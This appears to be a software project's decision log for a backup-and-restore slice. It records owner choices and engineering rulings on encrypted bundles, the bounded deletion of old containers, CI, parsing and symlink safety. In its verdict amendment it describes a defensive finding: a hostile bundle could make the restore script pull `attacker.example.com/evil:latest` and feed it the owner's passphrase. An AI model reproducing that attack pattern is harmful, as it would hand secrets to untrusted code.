# S41 rulings — what the owner decided, and what I ruled

## Owner decisions, 2026-09-21

Both were asked as questions because neither was mine to settle: one disposes
of his data, the other picks which of two contradictory specs the slice obeys.

### 1. The mini PC's old `nova` stack: **delete it, containers and volumes**

The mini PC holds a stopped Nova from the **platform line** under the same
compose project name v4 uses (`nova`): containers `nova-postgres-1`,
`nova-orchestrator-1` and others, volumes `nova_pgdata`, `nova_postgres-data`,
`nova_redis-data`, `nova_redis_data`. v4's project is also `nova`, so a plain
`docker compose up` there would **adopt and recreate** those containers.

Offered: rename the old project and keep its data; delete it outright; or
refuse and leave it to him. **He chose deletion.**

What that binds in S41:
- `install.sh` **refuses** when a foreign `nova` project is on the target and
  **names every container and volume it found** before offering anything.
- The removal it then offers deletes **only** what it named, and the names come
  from `docker` output, never from a list in the script.
- It must be impossible for that path to touch a v4 volume. That is a test, not
  a promise: a fixture with both old and v4 volumes present, asserting the v4
  ones survive.
- Deletion is irreversible, so the offer states what will be destroyed, and the
  default is to do nothing.

### 2. S41 ships the **encrypted bundle**, not the plain tar

The approved plan's S41 bullets describe a plain tar-and-manifest pipeline;
ARCS arc 8, resting on his 2026-08-02 ruling, requires a complete **encrypted**
bundle with a passphrase **resolver seam** and the restore script **inside every
bundle**, with coverage **derived from the compose file** that refuses on an
unclassified volume. Both readings are checked in, and commit `8920faaf` flagged
the gap without closing it.

Offered: encrypted now; plain first and encryption later; or encrypted plus the
whole secrets store. **He chose encrypted in S41.**

What that binds:
- Arc 8 wins wherever it contradicts the S41 bullets. The plain-tar sketch in
  `hub-topology.md:298-318` and `hub/r2-integration.md:393-411` is **superseded**
  on encryption and on coverage.
- `BACKUP_EXCLUDE_DATA`, the hand-kept list, is **not built**. Coverage is
  derived from the compose file and **refuses** on an unclassified volume.
- Proposal A (the secrets store) stays out of S41; only the passphrase
  **resolver seam** lands, so a secrets manager can supply it later.

## My rulings

- **Mine v3, do not redesign.** v3's `backend/app/backup_*.py` (8 modules) and
  `scripts/nova_restore.py` already implement the encrypted bundle, the
  passphrase resolver, coverage classification, the standalone in-bundle restore
  script and a non-destructive verify drill — about 3,800 lines. S41 ports what
  fits v4's compose stack and states what it drops. Cost if wrong: v3's shapes
  carry assumptions v4 does not share, and a port hides them; the designs must
  therefore read v3 critically, not copy it.
- **`network_credentials` is carried, not excluded.** The bundle is encrypted,
  which is the condition D15's exclusion existed to work around. Coverage is
  schema-driven, so the table is carried the day S43a creates it. The
  now-wrong "backups exclude `network_credentials`" text at
  `hub-topology.md:135,411` and `hub/r2-integration.md:61,550` is corrected
  when S41 lands. Cost if wrong: a restored hub silently loses its tailnet
  credential and the `network_credential_missing` check has to ask for it again
  — which is exactly what S43b already specifies as the fallback.
- **S41 remains operator tooling: no new tool, no guard, no eval case.** The
  chat walk belongs to S45. Cost if wrong: the drill verb is her capability by
  arc 8, so if it turns out the drill must be hers in S41, that is one tool and
  one eval added on top, not a redesign.


## My rulings, added 2026-09-21 after the cleanup

- **The foreign-project refusal and its deletion are proven against a
  deliberately-built synthetic foreign project, never against his data.**
  After the cleanup there is no real foreign `nova` project left anywhere, so
  the one irreversible path in S41 would otherwise ship fixture-proven and
  never executed — "a reply is a claim" applies to a script as much as to her.
  T7's walk therefore **creates** a throwaway compose project named `nova`
  (one `busybox` container, one volume, correct `com.docker.compose.project`
  labels) on the target machine, next to a decoy volume whose NAME starts with
  `nova_` but whose label says another project, and next to a real v4 volume.
  The walk then runs the refusal, runs the bounded deletion, and verifies that
  the synthetic project is gone while the decoy and the v4 volume survive.
  Cost if wrong: the walk itself runs a destructive path on a live machine —
  which is why every object it may touch is one the walk created, and why the
  decoy exists.
- **The stale binding inputs are corrected, not just superseded inline.**
  `map-requirements.md` still described the 172.18 collision and the stopped
  platform-line project in the present tense. A map that contradicts the
  verdict is a trap for an implementer who reads the map first, which the task
  briefs will tell them to do.


## Owner decision, 2026-09-21 (late): the macOS CI work ships

Asked as verdict §16's one owner question — widen `rebuild-ci.yml`'s trigger
so anything in this slice runs at all. Answer: **"You can also implement that
macOS ci work."**

So **requirement #27 is MET, not deferred**, and T6 builds it:

- the trigger widens from `rebuild/**` to include `slice/**` and `main`;
- a **`macos-15`** job runs `install_test.sh` and `backup_test.sh` under
  `/bin/bash` (bash 3.2 there, which is the whole point — it is the only place
  the BSD-userland path is ever executed);
- the workflow is **re-enabled** on GitHub. It is currently
  `disabled_manually`, so a widened trigger alone would fire nothing; the
  jobs would be theatre. Both halves or neither.
- the `bash -n` step stays as well: it is cheap and it catches a syntax error
  before a runner is spent.

This reverses the standing 2026-09-07 "CI and hooks OFF for now" decision **for
this workflow only**. `core.hooksPath=/dev/null` is untouched. Cost if wrong:
red builds start mattering again, which is what he switched off; turning it
back off is `gh workflow disable rebuild-ci`, and the slice record then says
macOS is untested rather than implying coverage.

It also settles verdict §15 risk 4: `nova_restore.py`'s two hardcoded Homebrew
libcrypto paths have never been executed on a Mac, and the `macos-15` job
running `test_restore_reader.py` with `NOVA_FORCE_CTYPES_GCM=1` is the only
thing that ever will. The repo is public, so those runners cost nothing.


## My ruling, 2026-09-21: the raw compose text is parsed by a YAML parser, not by awk

**What changes:** `compose_read.sh`'s `raw_*` functions hand-parse YAML in
POSIX awk to produce `facts/raw.json`. That parsing moves into
`novabundle.py`, which already runs in the pack container and where
**PyYAML 6.0.3 is present in the runtime image**. The shell stages the raw text
of every file in `COMPOSE_FILE`; the container parses it.

> **Correction, 2026-09-21 — my citation was wrong, and the implementer caught
> it.** I wrote that PyYAML is a dependency at `services/core/pyproject.toml:31`.
> That line is under **`[dependency-groups]`** — the dev group — and the image
> builds with `uv sync --frozen --no-dev`. PyYAML reaches the runtime image
> only **transitively, through `uvicorn[standard]`**. Verified by hand: the
> running core image has PyYAML 6.0.3 and uvicorn 0.52.4 installed, and line 31
> is in the dev table. The conclusion survives — the parser does have PyYAML —
> but it rests on a transitive extra rather than on a declared dependency,
> which is weaker than I claimed. `test_pyyaml_is_in_the_core_images_runtime_closure`
> now refuses the day that stops being true.
>
> **Carried:** declare `pyyaml` in core's **runtime** dependencies, so the pack
> step depends on something stated rather than inherited. It needs a lock
> refresh and a core image rebuild, so it belongs with T6 rather than in a
> coverage commit.

**What does NOT change, and must not be misread as changing:** the
**two-sources** principle of verdict §6.1 stands exactly as written. The
declared set still comes from the **raw text**, because compose prunes a
declared-but-unmounted volume from every render; dispositions still come from
the **YAML render**, because the JSON render strips nested `x-` keys. This
ruling changes the *parser*, not the *source*. The comment at
`compose_read.sh:24-27` warns against a later "just parse the JSON, it needs
no awk" simplification — that warning is still right, and this is not that.

**Why.** Four fix rounds produced six defects in the awk reader, each one a
real bind that a real `docker compose config` resolves and the reader did not
see: short syntax (NF-2), single-line flow mapping (New 2), line-spanning flow
mapping (found while fixing New 2), an unbalanced brace in a quoted reason or a
comment swallowing every following item (round-3 regression), list items at 4-
or 8-space indentation, a flow sequence at 8 spaces, and `- ${MOUNTSPEC}`
carrying a whole `src:tgt`. Each fix revealed the next in a different place.
That is the pattern that says the architecture is wrong, not the line.

A mechanism whose entire purpose is **to refuse rather than silently skip**
cannot rest on a parser that silently skips whatever its author did not
anticipate. PyYAML handles the whole grammar — every spelling, every
indentation, quoting, comments, anchors and aliases — and the classes above
stop being a list to maintain.

**Cost if wrong:** the container gains a job the shell used to do. It is the
same container, with no docker socket, already handling every other byte, and
the parse is of a file the operator wrote — not of anything secret. If PyYAML
ever leaves the core image, the pack step fails loudly at the import rather
than degrading.

**Still required, unchanged:** interpolation (`${VOL}`) is undecidable from raw
text and stays **reconciled against the render** — raw says what exists, the
render says what it resolves to. Anything the parser genuinely cannot decide is
a stated refusal, never a skip.


## My rulings, 2026-09-21 (from T2's report)

### A. `safe_extract` refuses an ESCAPING symlink, not every symlink

The verdict contradicts itself: §9.2 and §12.3 say "a symlink" flatly, while
§5.2 and §5.5's own example listing show links inside the tar
(`l 0777 … ./people/current`). **T2's reading stands.** Absolute paths, `..`,
device nodes and fifos are refused unconditionally; a link is refused only when
its target leaves the extraction root.

**Why:** a blanket refusal makes a real memory volume unbackupable, and the
memory store is markdown files on disk where a `current` pointer is an ordinary
shape. A backup that refuses the data it exists to carry is not a safety
property, it is a broken product. The security property that matters — nothing
lands outside the root — is preserved exactly.

**Cost if wrong:** a contained link could still point somewhere surprising
*inside* the restored tree. That is visible in the listing, which travels in
the bundle, and it cannot reach the host.

### B. `§5.3` wins over `§9.2 step 7`: the field is `migrations_member`

§9.2 step 7 reads `manifest.databases[].migrations`; §5.3 defines
`migrations_member`, a TSV path, and defines no `migrations`. T2 implemented
§5.3. **§5.3 is the schema and it wins.** T4 builds against
`migrations_member`. Cost if wrong: one field rename in one reader.

### C. Recorded, not changed

- The failure sentence carries **no trailing full stop** — v3's exact bytes,
  which is the point, since a v3-written payload must still open.
- `meta.passphrase_fingerprint` is derived under **`kat.enc`'s** salt (§7.4
  does not say which file's).
- `pack` performs §9.1 steps 16, 18 and 19, because §4 names no verb for the
  outer tar or the chown.

### D. My own process error, recorded because it cost authorship

T2's edits to `deploy/.env.example` and `.gitignore` were swept into **my**
commit `7605484b`: I ran `git add` on those paths while its edits sat
uncommitted in the same worktree. The content is correct and present; the
authorship is wrong. This is the known hazard of two workers sharing one git
index, and the rule I gave the implementers — stage only your own paths —
applies to me at least as strongly, because I am the one who commits while
others are mid-edit.


## Verdict amendment, 2026-09-21: §7.3's image must not come from the bundle

**The verdict was wrong and the implementer proved it.** §7.3 has `restore.sh`
read the decryptor image out of the bundle's cleartext `meta.json`. Measured
with a recording docker stub, that means a hostile bundle can make the restore
script `docker pull attacker.example.com/evil:latest` and then hand it the
owner's passphrase on stdin.

§5.4's own rule already forbids this: *nothing that survives a failed decrypt
is decided by `meta.json`*. An image that has already been pulled, run, and fed
the passphrase **has survived the decrypt completely** — it never needed the
decrypt to succeed. §2's rejection 5 does not save it either: a wrong
passphrase choice costs nothing and is caught, while a wrong image choice has
already happened by the time anything is checked.

**Amended:** the decryptor images are **constants in `restore.sh`**, overridable
only by `NOVA_CRYPTO_IMAGE` / `NOVA_FALLBACK_IMAGE` that the operator types. A
test asserts mechanically that no `meta.json` reader remains in that path.
`meta.json` is left with exactly one consumer, the advisory fingerprint.

**The class, stated once so the next reader sees it:** this was the **third**
instance in one file of *an unauthenticated value steering an action* — the
`restore_to` path escape was the first, `verify_extracted` joining
`members[].path` the second. A bundle is a file that can come from anywhere;
nothing inside it may select the code that opens it, or where that code writes.

### Consequence for other tasks

- **C3 changes the listing format.** A fifth line kind, `L ./path -> target`,
  one per symlink, in the same sorted file — because a **retargeted** symlink
  was invisible to both verifiers, so the backup could not notice its own data
  being repointed. T3 adds one pass (`find . -type l -printf "L %p -> %l\n"`);
  a listing naming an `l` entry with no `L` line is a **refusal**, not a skip.
- **Carried-script digests moved again**: `nova_restore.py` `bead35a6…`,
  `restore.sh` `894fead8…`. T6 publishes these.


## Ruling, 2026-09-21: a failed `--move` parks or restarts, and says which

T3's review found that a `--move` failing anywhere between §9.1 steps 7 and 21
leaves `core`, `gateway`, `memory` **and `tailscale`** stopped, writes no
marker, and prints one sentence about `pg_dump`. The host is then neither
running nor parked, and **off the tailnet** — which is how the owner reaches
Nova at all.

§9.1 step 7's wording permits this, so it is a **hole in the verdict**, not a
violation of it. Closed here:

- Every exit path of `--move` ends in one of exactly two states, and **says
  which one**: the writers are running again, or the host is parked with the
  marker written.
- "Parked" is a state the operator can see and undo, so it is written down
  before it is reported, and read back after.
- Losing the tailnet is never a silent consequence of a failed backup. If the
  sidecar was stopped, the failure path restarts it or states plainly that it
  could not.

**Why this is not a nicety:** the machine being moved is the one the owner
reaches over the tailnet. A failure that quietly leaves it unreachable turns a
recoverable backup error into "Nova is gone", at the exact moment he is doing
something risky with his data.

**Cost if wrong:** a restart that races the move's own teardown. Bounded by
the EXIT trap owning the decision in one place, which is already the shape T3
built for the non-move path.
